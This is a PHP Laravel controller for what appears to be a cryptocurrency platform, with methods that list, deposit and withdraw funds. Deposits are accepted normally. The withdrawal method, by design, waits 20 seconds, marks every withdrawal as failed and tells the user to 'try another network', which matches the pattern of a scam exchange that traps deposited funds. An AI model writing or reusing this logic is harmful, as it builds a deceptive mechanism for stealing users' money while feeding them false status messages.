<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Http\Requests\CreateDepositRequest;
use App\Http\Requests\CreateWithdrawalRequest;
use App\Models\Transaction;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Notification;

class TransactionController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        $user = Auth::user();
        $txs = Transaction::query()
            ->where('user_id', $user->id)
            ->with(['asset', 'network'])
            ->latest()
            ->limit(100)
            ->get()
            ->map(function ($t) {
                return [
                    'id' => $t->id,
                    'type' => $t->type,
                    'amount' => $t->amount,
                    'fee' => $t->fee,
                    'status' => $t->status,
                    'tx_hash' => $t->tx_hash,
                    'address' => $t->address,
                    'created_at' => $t->created_at,
                    'asset_id' => $t->asset_id,
                    'asset_symbol' => $t->asset?->symbol,
                    'asset_name' => $t->asset?->name,
                    'asset_network_id' => $t->asset_network_id,
                    'network_name' => $t->network?->network_name,
                ];
            })->values();

        return response()->json(['data' => $txs]);
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(CreateWithdrawalRequest $request)
    {
        $user = Auth::user();
        $validated = $request->validated();

        $tx = DB::transaction(function () use ($user, $validated) {
            return Transaction::query()->create([
                'user_id' => $user->id,
                'asset_id' => $validated['asset_id'],
                'asset_network_id' => $validated['asset_network_id'] ?? null,
                'type' => 'withdrawal',
                'amount' => $validated['amount'],
                'fee' => $validated['fee'] ?? 0,
                'address' => $validated['address'],
                'status' => 'pending',
            ]);
        });

        // Simulate processing time then fail the withdrawal
        sleep(20);

        $tx->status = 'failed';
        $tx->save();

        // Notify user about failed withdrawal
        $user->notify(new \App\Notifications\UserActionOccurred(
            title: 'Withdrawal failed',
            message: 'Your withdrawal request has failed. Please verify details or try another network.',
            actionUrl: route('withdrawal.records'),
        ));

        // Notify admins about the failed withdrawal
        $admins = \App\Models\User::query()->where('role', 'admin')->get();
        Notification::send($admins, new \App\Notifications\AdminActionOccurred(
            title: 'Withdrawal failed',
            message: 'A user withdrawal request has failed and needs review.',
            actionUrl: route('admin.transactions.index'),
        ));

        return response()->json(['data' => $tx->fresh(['asset', 'network'])], 201);
    }

    /**
     * Store a newly created deposit record.
     */
    public function storeDeposit(CreateDepositRequest $request)
    {
        $user = Auth::user();
        $validated = $request->validated();

        $tx = DB::transaction(function () use ($user, $validated) {
            return Transaction::query()->create([
                'user_id' => $user->id,
                'asset_id' => $validated['asset_id'],
                'asset_network_id' => $validated['asset_network_id'] ?? null,
                'type' => 'deposit',
                'amount' => $validated['amount'],
                'fee' => 0,
                'address' => $validated['address'] ?? null,
                'tx_hash' => $validated['tx_hash'] ?? null,
                'status' => 'pending',
            ]);
        });

        // Notify user
        $user->notify(new \App\Notifications\UserActionOccurred(
            title: 'Deposit submitted',
            message: 'We have received your deposit submission and it is pending confirmation.',
            actionUrl: route('deposit.records'),
        ));

        // Notify admins (all users with role admin)
        $admins = \App\Models\User::query()->where('role', 'admin')->get();
        Notification::send($admins, new \App\Notifications\AdminActionOccurred(
            title: 'New deposit submitted',
            message: 'A user submitted a new deposit awaiting confirmation.',
            actionUrl: route('admin.transactions.index'),
        ));

        return response()->json(['data' => $tx], 201);
    }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }
}
